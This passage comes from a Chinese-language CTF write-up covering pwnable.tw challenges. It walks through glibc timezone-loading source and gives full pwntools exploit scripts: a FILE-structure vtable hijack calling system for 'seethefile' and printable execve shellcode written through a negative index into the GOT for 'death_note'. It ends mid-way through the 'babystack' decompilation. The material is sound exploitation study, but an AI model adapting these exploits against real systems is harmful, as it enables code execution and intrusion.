class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">/* Return the `struct tm&apos; representation of *T in local time.  */</span><br><span class="line">struct tm *</span><br><span class="line">localtime (const time_t *t)</span><br><span class="line">&#123;</span><br><span class="line">  return __tz_convert (t, 1, &amp;_tmbuf);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (localtime)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Return the `struct tm&apos; representation of *TIMER in the local timezone.</span><br><span class="line">   Use local time if USE_LOCALTIME is nonzero, UTC otherwise.  */</span><br><span class="line">struct tm *</span><br><span class="line">__tz_convert (const time_t *timer, int use_localtime, struct tm *tp)</span><br><span class="line">&#123;</span><br><span class="line">  long int leap_correction;</span><br><span class="line">  int leap_extra_secs;</span><br><span class="line"></span><br><span class="line">  if (timer == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (tzset_lock);</span><br><span class="line"></span><br><span class="line">  /* Update internal database according to current TZ setting.</span><br><span class="line">     POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname.</span><br><span class="line">     This is a good idea since this allows at least a bit more parallelism.  */</span><br><span class="line">  tzset_internal (tp == &amp;_tmbuf &amp;&amp; use_localtime, 1);</span><br><span class="line"></span><br><span class="line">  if (__use_tzfile)</span><br><span class="line">    __tzfile_compute (*timer, use_localtime, &amp;leap_correction,</span><br><span class="line">      &amp;leap_extra_secs, tp);</span><br><span class="line">      </span><br><span class="line">  &lt;--无关代码省略--&gt;</span><br><span class="line">  </span><br><span class="line">  return tp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Interpret the TZ envariable.  */</span><br><span class="line">static void</span><br><span class="line">internal_function</span><br><span class="line">tzset_internal (int always, int explicit)</span><br><span class="line">&#123;</span><br><span class="line">  static int is_initialized;</span><br><span class="line">  const char *tz;</span><br><span class="line"></span><br><span class="line">  if (is_initialized &amp;&amp; !always)</span><br><span class="line">    return;</span><br><span class="line">  is_initialized = 1;</span><br><span class="line"></span><br><span class="line">  /* Examine the TZ environment variable.  */</span><br><span class="line">  tz = getenv (&quot;TZ&quot;);//★注意此处,从env中读取TZ的值</span><br><span class="line">  if (tz == NULL &amp;&amp; !explicit)</span><br><span class="line">    /* Use the site-wide default.  This is a file name which means we</span><br><span class="line">       would not see changes to the file if we compare only the file</span><br><span class="line">       name for change.  We want to notice file changes if tzset() has</span><br><span class="line">       been called explicitly.  Leave TZ as NULL in this case.  */</span><br><span class="line">    tz = TZDEFAULT;</span><br><span class="line">  if (tz &amp;&amp; *tz == &apos;\0&apos;)</span><br><span class="line">    /* User specified the empty string; use UTC explicitly.  */</span><br><span class="line">    tz = &quot;Universal&quot;;</span><br><span class="line"></span><br><span class="line">  /* A leading colon means &quot;implementation defined syntax&quot;.</span><br><span class="line">     We ignore the colon and always use the same algorithm:</span><br><span class="line">     try a data file, and if none exists parse the 1003.1 syntax.  */</span><br><span class="line">  if (tz &amp;&amp; *tz == &apos;:&apos;)</span><br><span class="line">    ++tz;</span><br><span class="line"></span><br><span class="line">  /* Check whether the value changed since the last run.  */</span><br><span class="line">  if (old_tz != NULL &amp;&amp; tz != NULL &amp;&amp; strcmp (tz, old_tz) == 0)</span><br><span class="line">    /* No change, simply return.  */</span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">  if (tz == NULL)</span><br><span class="line">    /* No user specification; use the site-wide default.  */</span><br><span class="line">    tz = TZDEFAULT;</span><br><span class="line"></span><br><span class="line">  tz_rules[0].name = NULL;</span><br><span class="line">  tz_rules[1].name = NULL;</span><br><span class="line"></span><br><span class="line">  /* Save the value of `tz&apos;.  */</span><br><span class="line">  free (old_tz);</span><br><span class="line">  old_tz = tz ? __strdup (tz) : NULL;</span><br><span class="line"></span><br><span class="line">  /* Try to read a data file.  */</span><br><span class="line">  __tzfile_read (tz, 0, NULL);//★带着TZ进入__tzfile_read函数</span><br><span class="line">  if (__use_tzfile)</span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">&lt;--无关代码省略--&gt;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void</span><br><span class="line">__tzfile_read (const char *file, size_t extra, char **extrap)</span><br><span class="line">&#123;</span><br><span class="line">  static const char default_tzdir[] = TZDIR;</span><br><span class="line">  size_t num_isstd, num_isgmt;</span><br><span class="line">  FILE *f;</span><br><span class="line">  struct tzhead tzhead;</span><br><span class="line">  size_t chars;</span><br><span class="line">  size_t i;</span><br><span class="line">  size_t total_size;</span><br><span class="line">  size_t types_idx;</span><br><span class="line">  size_t leaps_idx;</span><br><span class="line">  int was_using_tzfile = __use_tzfile;</span><br><span class="line">  int trans_width = 4;</span><br><span class="line">  size_t tzspec_len;</span><br><span class="line">  char *new = NULL;</span><br><span class="line"></span><br><span class="line">  if (sizeof (time_t) != 4 &amp;&amp; sizeof (time_t) != 8)</span><br><span class="line">    abort ();</span><br><span class="line"></span><br><span class="line">  __use_tzfile = 0;</span><br><span class="line"></span><br><span class="line">  if (file == NULL)</span><br><span class="line">    /* No user specification; use the site-wide default.  */</span><br><span class="line">    file = TZDEFAULT;</span><br><span class="line">  else if (*file == &apos;\0&apos;)</span><br><span class="line">    /* User specified the empty string; use UTC with no leap seconds.  */</span><br><span class="line">    goto ret_free_transitions;</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      /* We must not allow to read an arbitrary file in a setuid</span><br><span class="line"> program.  So we fail for any file which is not in the</span><br><span class="line"> directory hierachy starting at TZDIR</span><br><span class="line"> and which is not the system wide default TZDEFAULT.  */</span><br><span class="line">      if (__libc_enable_secure</span><br><span class="line">  &amp;&amp; ((*file == &apos;/&apos;</span><br><span class="line">       &amp;&amp; memcmp (file, TZDEFAULT, sizeof TZDEFAULT)</span><br><span class="line">       &amp;&amp; memcmp (file, default_tzdir, sizeof (default_tzdir) - 1))</span><br><span class="line">      || strstr (file, &quot;../&quot;) != NULL))</span><br><span class="line">/* This test is certainly a bit too restrictive but it should</span><br><span class="line">   catch all critical cases.  */</span><br><span class="line">goto ret_free_transitions;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (*file != &apos;/&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">      const char *tzdir;</span><br><span class="line"></span><br><span class="line">      tzdir = getenv (&quot;TZDIR&quot;);//★从环境变量TZDIR中读取目录</span><br><span class="line">      if (tzdir == NULL || *tzdir == &apos;\0&apos;)</span><br><span class="line">tzdir = default_tzdir;</span><br><span class="line">      if (__asprintf (&amp;new, &quot;%s/%s&quot;, tzdir, file) == -1)</span><br><span class="line">goto ret_free_transitions;</span><br><span class="line">      file = new;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* If we were already using tzfile, check whether the file changed.  */</span><br><span class="line">  struct stat64 st;</span><br><span class="line">  if (was_using_tzfile</span><br><span class="line">      &amp;&amp; stat64 (file, &amp;st) == 0</span><br><span class="line">      &amp;&amp; tzfile_ino == st.st_ino &amp;&amp; tzfile_dev == st.st_dev</span><br><span class="line">      &amp;&amp; tzfile_mtime == st.st_mtime)</span><br><span class="line">    goto done;  /* Nothing to do.  */</span><br><span class="line"></span><br><span class="line">  /* Note the file is opened with cancellation in the I/O functions</span><br><span class="line">     disabled and if available FD_CLOEXEC set.  */</span><br><span class="line">  f = fopen (file, &quot;rce&quot;);//★打开文件</span><br></pre></td></tr></table></figure><p>最后是通过malloc读取文件内容到heap上的，所以我们只需要控制TZ 和 TZDIR 就能读取flag内容到heap上；（类似于函数源码漏洞？）</p><p>printf_chk 源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* Write formatted output to stdout from the format string FORMAT.  */</span><br><span class="line">int</span><br><span class="line">___printf_chk (int flag, const char *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  int done;</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock_clear_flags2 (stdout);</span><br><span class="line">  if (flag &gt; 0)</span><br><span class="line">    stdout-&gt;_flags2 |= _IO_FLAGS2_FORTIFY;</span><br><span class="line"></span><br><span class="line">  va_start (ap, format);</span><br><span class="line">  done = vfprintf (stdout, format, ap);</span><br><span class="line">  va_end (ap);</span><br><span class="line"></span><br><span class="line">  if (flag &gt; 0)</span><br><span class="line">    stdout-&gt;_flags2 &amp;= ~_IO_FLAGS2_FORTIFY;</span><br><span class="line">  _IO_release_lock (stdout);</span><br><span class="line"></span><br><span class="line">  return done;</span><br><span class="line">&#125;</span><br><span class="line">ldbl_strong_alias (___printf_chk, __printf_chk)</span><br></pre></td></tr></table></figure><p>printf_chk 格式化字符串漏洞。。。神奇、、</p><h1 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h1><p>第一次见FILE题，学习一下</p><h2 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h2><p>功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;---------------MENU---------------&quot;);</span><br><span class="line">  puts(&quot;  1. Open&quot;);</span><br><span class="line">  puts(&quot;  2. Read&quot;);</span><br><span class="line">  puts(&quot;  3. Write to screen&quot;);</span><br><span class="line">  puts(&quot;  4. Close&quot;);</span><br><span class="line">  puts(&quot;  5. Exit&quot;);</span><br><span class="line">  puts(&quot;----------------------------------&quot;);</span><br><span class="line">  return printf(&quot;Your choice :&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>open打开文件，read读入0x18f的数据，如果文件名或读入的数据中没有‘flag’ 或 ‘FLAG’，就能够write到屏幕上，close关闭文件，exit时让输入姓名，会溢出。</p><h2 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h2><p>后面给了一个明显的溢出，也就是我们的切入点，gdb调试发现name在bss段，后面只有一个指向文件的fp指针，意图很明显。<br>我们可以先读取/map/self/maps 来获取程序的段信息，虽然能读入的信息较少，但是足以获得heap基地址以用来得到libc基地址。<br>至于fp指针，需要将其覆盖并继续溢出伪造一个FILE结构体，fp指针就是指向这个结构体以避免程序错误退出，同时将伪造的虚表上的vtable该为system，fclose即可即可调用system。</p><h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#sh = process(&apos;./seethefile&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10200)</span><br><span class="line">elf = ELF(&apos;./seethefile&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line">def open(name):</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;see :&apos;)</span><br><span class="line">sh.sendline(name)</span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line">def close():</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line">def exit(con):</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;5&apos;)</span><br><span class="line">sh.recvuntil(&apos;Leave your name :&apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">open(&apos;/proc/self/maps&apos;)</span><br><span class="line">read()</span><br><span class="line">write()</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">heap = int(sh.recvline()[:8],16)</span><br><span class="line">success(&apos;heap: &apos;+hex(heap))</span><br><span class="line">libc.address = int(sh.recvline()[:8],16)+0x1000</span><br><span class="line">success(&apos;libc_base: &apos;+hex(libc.address))</span><br><span class="line">system = libc.symbols[&apos;system&apos;]</span><br><span class="line">close()</span><br><span class="line"></span><br><span class="line">pay = &apos;\x00&apos;*32 + p32(0x0804B300)</span><br><span class="line">pay+=&apos;\x00&apos;*(0x80-4)</span><br><span class="line">file = &apos;\xff\xff\xff\xff;$0\x00&apos;.ljust(0x48,&apos;\x00&apos;)</span><br><span class="line">file = file.ljust(0x94,&apos;\x00&apos;)  //在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8;</span><br><span class="line">pay+=file</span><br><span class="line">pay+=p32(0x0804B300+0x98)</span><br><span class="line">pay+=p32(system)*21#vtable</span><br><span class="line">exit(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="death-note"><a href="#death-note" class="headerlink" title="death_note"></a>death_note</h1><p><em>话说这边的题难度真是飘忽不定。。</em></p><h2 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;-----------------------------------&quot;);</span><br><span class="line">  puts(&quot;             DeathNote             &quot;);</span><br><span class="line">  puts(&quot;-----------------------------------&quot;);</span><br><span class="line">  puts(&quot; 1. Add a name                     &quot;);</span><br><span class="line">  puts(&quot; 2. show a name on the note        &quot;);</span><br><span class="line">  puts(&quot; 3. delete a name int the note     &quot;);</span><br><span class="line">  puts(&quot; 4. Exit                           &quot;);</span><br><span class="line">  puts(&quot;-----------------------------------&quot;);</span><br><span class="line">  return printf(&quot;Your choice :&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># checksec death_note</span><br><span class="line">[*] &apos;/root/pwnable/death_note1/death_note&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h2 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h2><p>题目的功能就是menu上的那样，不过在里面add的时候，index是自己选的，而且没有任何限制， 所以是有希望随便输入负数，将name也就是我们要输入的shellcode往上覆盖到got表来get shell。</p><p>输入的内容会进行检查，必须是可打印字符且最长为0x50，所以shellcode也需要在限制条件之内。<br>shellcode可以使用metasploit自带的msfvenom来生成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./death_note&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10201)</span><br><span class="line"></span><br><span class="line">def add(idx,con):</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(&apos;Name :&apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">pay = asm(&apos;&apos;&apos;</span><br><span class="line">/* execve(&apos;/bin///sh&apos;,0,0)*/</span><br><span class="line"></span><br><span class="line">push 0x68</span><br><span class="line">push 0x732f2f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line"></span><br><span class="line">push esp</span><br><span class="line">pop ebx /*set ebx to &apos;/bin///sh&apos;*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">dec edx</span><br><span class="line">dec edx /*set dl to 0xfe*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor [eax+32],dl /*decode int 0x80*/</span><br><span class="line">xor [eax+33],dl /*decode int 0x80*/</span><br><span class="line"></span><br><span class="line">inc edx</span><br><span class="line">inc edx /*recover edx to 0*/</span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">pop ecx /*set ecx to 0*/</span><br><span class="line"></span><br><span class="line">push 0x40</span><br><span class="line">pop eax</span><br><span class="line">xor al,0x4b /*set eax to 0xb*/</span><br><span class="line"></span><br><span class="line">/*int 0x80*/</span><br><span class="line">&apos;&apos;&apos;)+&apos;\x33\x7e&apos;</span><br><span class="line"></span><br><span class="line">add(-19,pay)</span><br><span class="line">dele(-19)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><p><em>终于有时间继续做了、、</em></p><h2 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h2><p>保护全开。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; // rcx</span><br><span class="line">  __int64 v4; // rdx</span><br><span class="line">  char des; // [rsp+0h] [rbp-60h]</span><br><span class="line">  __int64 buf; // [rsp+40h] [rbp-20h]</span><br><span class="line">  __int64 v8; // [rsp+48h] [rbp-18h]</span><br><span class="line">  char v9; // [rsp+50h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  mmap_for_proc();</span><br><span class="line">  files[0] = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(files[0], &amp;buf, 0x10uLL);</span><br><span class="line">  v3 = IsMmap_ptr;</span><br><span class="line">  v4 = v8;</span><br><span class="line">  *IsMmap_ptr = buf;</span><br><span class="line">  v3[1] = v4;</span><br><span class="line">  close(files[0]);                              </span><br><span class="line">                                                 </span><br><span class="line">                                                 </span><br><span class="line">                                                 </span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(1, &quot;&gt;&gt; &quot;, 3uLL);</span><br><span class="line">    _read_chk(0LL, &amp;v9, 0x10LL, 0x10LL);</span><br><span class="line">    if ( v9 == &apos;2&apos; )</span><br><span class="line">      break;</span><br><span class="line">    if ( v9 == &apos;3&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( password_inuse )</span><br><span class="line">        read_to_des(&amp;des);</span><br><span class="line">      else</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v9 == &apos;1&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( password_inuse )</span><br><span class="line">        password_inuse = 0;</span><br><span class="line">      else</span><br><span class="line">        login(&amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Invalid choice&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !password_inuse )</span><br><span class="line">    exit(0);</span><br><span class="line">  if ( memcmp(&amp;buf, IsMmap_ptr, 0x10uLL) )</span><br><span class="line">    JUMPOUT(loc_100B);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall login(const char *buf)</span><br><span class="line">&#123;</span><br><span class="line">  size_t len; // rax</span><br><span class="line">  char s; // [rsp+10h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Your passowrd :&quot;);</span><br><span class="line">  read_int(&amp;s, 0x7Fu);</span><br><span class="line">  len = strlen(&amp;s);</span><br><span class="line">  if ( strncmp(&amp;s, buf, len) )</span><br><span class="line">    return puts(&quot;Failed !&quot;);</span><br><span class="line">  password_inuse = 1;</span><br><span class="line">  return puts(&quot;Login Success !&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall read_to_des(char *des)</span><br><span class="line">&#123;</span><br><span class="line">  char src; // [rsp+10h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Copy :&quot;);</span><br><span class="line">  read_int(&amp;src, 0x3Fu);</span><br><span class="line">  strcpy(des, &amp;src);</span><br><span 